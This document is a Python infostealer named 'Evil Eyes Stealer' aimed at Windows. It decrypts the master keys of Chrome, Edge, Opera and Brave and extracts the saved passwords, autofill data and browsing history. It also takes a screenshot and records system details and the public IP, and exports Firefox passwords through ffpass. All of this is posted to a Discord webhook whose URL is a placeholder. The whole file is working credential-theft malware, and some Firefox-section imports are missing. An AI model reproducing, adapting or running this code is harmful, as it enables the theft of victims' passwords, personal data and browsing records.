import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import requests
import platform
from time import sleep
from PIL import ImageGrab
from urllib.request import Request, urlopen
from json import loads as json_loads, load
from json import *


localDir = os.getenv("LocalAppData")
chromeDir = os.path.join(localDir, 'Google', 'Chrome', 'User Data','Default')
chromeDir1 = os.path.join(localDir, 'Google', 'Chrome', 'User Data')
edgeDir= os.path.join(localDir,'Microsoft','Edge','User Data','Default')
edgeDir1= os.path.join(localDir,'Microsoft','Edge','User Data')
operaDir=os.path.join(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera Stable')
braveDir=os.path.join(localDir, 'BraveSoftware', 'Brave-Browser', 'User Data','Default')
braveDir1= os.path.join(localDir, 'BraveSoftware', 'Brave-Browser', 'User Data')
firefoxDir=os.path.join(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Mozilla\Firefox\Profiles\3djrv16o.default-release-1674218400461')

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def secrett():
    global secret_key  
    os.chdir(degsi)
    shutil.copyfile( 'Local State' , 'local.json' )
    with open("local.json","r") as f:
        data = json.load(f)
        key=base64.b64decode(data['os_crypt']["encrypted_key"])
        secret_key = key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def connectDB():
        global ciphertext, chromeDir, edgeDir
        uname = platform.uname()
        content = ("\n\n:money_with_wings: :money_with_wings: :money_with_wings: :money_with_wings:  **System Information** :money_with_wings:  :money_with_wings:  :money_with_wings:  :money_with_wings:")
        content += (f"\n:carousel_horse: System: {uname.system}")
        content += (f"\n:telephone: Username: {os.getlogin()}")
        content += (f"\n:woman_detective: PCName: {uname.node}")
        content += (f"\n:snowman2: Release: {uname.release}")
        content += (f"\n:cd: Version: {uname.version}")
        content += (f"\n:incoming_envelope: Machine: {uname.machine}")
        content += (f"\n:desktop: Processor: {uname.processor}")
        content+= (f"\n:trackball: Ip: {getip()}")
        content+= ("\n:dart: `Username and Password Saved in pwd.txt`")
        payloadd = {
            "content": content,
            "avatar_url": "https://c4.wallpaperflare.com/wallpaper/870/248/905/women-fantasy-girl-warrior-girls-archer-arrows-hd-wallpaper-preview.jpg",
            "username": "Evil Eyes Stealer by "
        }
        
        chrome_path_login_db = os.path.join(degsi, 'Login Data')
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        chromeAuto = os.path.join(degsi, 'Web Data')
        shutil.copy2(chromeAuto, "auto.db")
        chrome_path_login_db = os.path.join(degsi, 'History')
        shutil.copy2(chrome_path_login_db, "History.db")
        conn=sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        conn1=sqlite3.connect("auto.db")
        cursor1 = conn1.cursor()
        cursor1.execute("SELECT * FROM autofill") 
        conn2=sqlite3.connect("History.db")
        cursor2 = conn2.cursor()
        cursor2.execute("SELECT * FROM urls")
        with open('web.txt', 'w') as f:
            for i in cursor1.fetchall():
                #print((i[0])+" : "+i[1])
                f.write((i[0])+" : "+i[1]+"\n")
        with open('history.txt', 'w') as f:
            for r4 in cursor2.fetchall():
                #print(str(r4[1]))
                f.write("Url:"+r4[1]+"\n")
        with open('pwd.txt', 'w') as f:
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext= login[2]
                #print("\nUrl:",url)
                #print("Username :",username)
                try:
                    initialisation_vector = ciphertext[3:15]
                    encrypted_password = ciphertext[15:-16]
                    cipher = generate_cipher(secret_key, initialisation_vector)
                    decrypted_pass = decrypt_payload(cipher, encrypted_password)
                    decrypted_pass = decrypted_pass.decode()
                    #print("Password :",decrypted_pass)
                    f.write("Url:"+url+"\nUsername :"+username+"\nPassword :"+decrypted_pass)
                except Exception as e:
                    print("%s" % str(e))
                    return ""
        
        screen = ImageGrab.grab()
        screen.save('s.png')
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            files = {'file1': open('pwd.txt', 'rb'), 'file2': open('web.txt', 'rb'),'file3': open('history.txt', 'rb'),'file4': open('s.png', 'rb')}
            session.post("Discord Token Here", files=files, data=payloadd)
        #os.remove("s.png")
if os.path.isdir(chromeDir):
        degsi= chromeDir1
        secrett()
        degsi= chromeDir
        connectDB()

if os.path.isdir(edgeDir):
        degsi= edgeDir1
        secrett()
        degsi= edgeDir
        connectDB()
if os.path.isdir(operaDir):
        degsi= operaDir
        secrett()
        degsi= operaDir
        connectDB()
if os.path.isdir(braveDir):
        degsi= braveDir1
        secrett()
        degsi= braveDir
        connectDB()

#echo "HashAppend" >> .\default.exe
#Get-FileHash .\default.exe -Algorithm MD5

try:
    mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
    mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
    profile = configparser.ConfigParser()
    profile.read(mozilla_profile_ini)
    data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
    subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
    subprocess_return = subprocesss.stdout.read()
    passwords = str(subprocess_return)
    with open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "a", encoding="utf-8") as file:
        file.write(passwords.replace('\\r\n', ' '))
    f = open('C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\f1.txt', "rb")
except:
    pass
       
try:
    with requests.Session() as session:
        session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        session.post("Discord Token Here", files="f1.txt")

except Exception as e:
    print(e)
